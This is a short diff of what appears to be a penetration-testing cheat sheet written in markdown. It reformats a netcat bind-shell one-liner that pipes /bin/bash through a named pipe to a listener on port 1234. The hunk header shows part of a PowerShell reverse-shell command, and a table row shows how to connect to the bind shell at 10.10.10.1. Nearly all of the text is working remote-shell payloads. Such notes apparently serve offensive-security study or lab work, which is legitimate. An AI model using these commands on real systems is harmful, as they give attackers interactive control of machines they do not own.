@@ -208,7 +208,16 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 #BIND!!!!!
 
 #bash
-|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`|Start a bind shell on the remote server|
+
+> [!NOTE] Start a bind shell on the remote server|
+> ```
+ 
+rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp  1234 > /tmp/f  
+```
+
+
+
+
 
 |`nc 10.10.10.1 1234`|Connect to a bind shell started on the remote server|
 
